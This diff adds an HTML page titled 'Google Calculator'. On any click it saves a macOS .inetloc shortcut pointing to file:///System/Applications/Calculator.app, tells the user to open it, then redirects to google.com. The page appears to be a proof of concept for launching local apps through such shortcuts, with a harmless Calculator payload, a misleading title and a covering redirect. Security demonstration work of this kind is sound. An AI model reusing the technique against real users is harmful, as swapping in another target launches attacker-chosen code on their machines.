@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Calculator</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: #0f0f23;
+      color: #00ff88;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      cursor: pointer;
+    }
+    h1 {
+      font-size: 3.5rem;
+      margin-bottom: 1.5rem;
+      color: #5fff87;
+      text-shadow: 0 0 10px #00ff88;
+    }
+    p {
+      font-size: 1.4rem;
+      max-width: 700px;
+      line-height: 1.6;
+      margin-bottom: 2rem;
+    }
+    .hint {
+      margin-top: 2rem;
+      font-size: 1.1rem;
+      color: #aaa;
+      opacity: 0.8;
+    }
+    .status {
+      margin-top: 2rem;
+      font-size: 1.2rem;
+      color: #ffd166;
+    }
+  </style>
+</head>
+<body>
+  <h1>Click Anywhere</h1>
+  <p>
+    Click anywhere on this page to trigger the file saver.<br>
+    The file will be saved as <strong>Google Calculator.inetloc</strong>.<br>
+    Open the file on macOS → Calculator.app will launch immediately.
+  </p>
+  <p class="hint">
+    After saving → check Downloads and double-click the file to launch Calculator.
+  </p>
+  <div class="status" id="status">Waiting for click...</div>
+
+  <script>
+    const status = document.getElementById('status');
+
+    async function saveInetloc() {
+      status.textContent = "Preparing .inetloc file...";
+
+      if ('showSaveFilePicker' in window) {
+        try {
+          const handle = await window.showSaveFilePicker({
+            suggestedName: 'Google Calculator.inetloc',
+            types: [{
+              description: 'Internet Location File',
+              accept: { 
+                'application/internet-shortcut': ['.inetloc', '.url'] 
+              }
+            }],
+          });
+
+          status.textContent = "File location chosen. Writing content...";
+
+          const content = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>URL</key>
+  <string>file:///System/Applications/Calculator.app</string>
+</dict>
+</plist>`;
+
+          const writable = await handle.createWritable();
+          await writable.write(content);
+          await writable.close();
+
+          status.textContent = "Success! .inetloc file saved. You will be redirected...";
+
+          // Redirect after save success (tunggu 1.5 detik agar user baca pesan)
+          setTimeout(() => {
+            window.location.href = 'https://google.com';
+          }, 1500);
+
+        } catch (err) {
+          if (err.name === 'AbortError') {
+            status.textContent = "User cancelled the save dialog.";
+          } else {
+            status.textContent = "Error: " + err.name + " - " + err.message;
+            console.error("Save failed:", err);
+          }
+        }
+      } else {
+        status.textContent = "Warning: showSaveFilePicker is not supported in this browser.";
+      }
+    }
+
+    // Klik di mana saja juga trigger
+    document.addEventListener('click', saveInetloc);
+  </script>
+</body>
+</html>
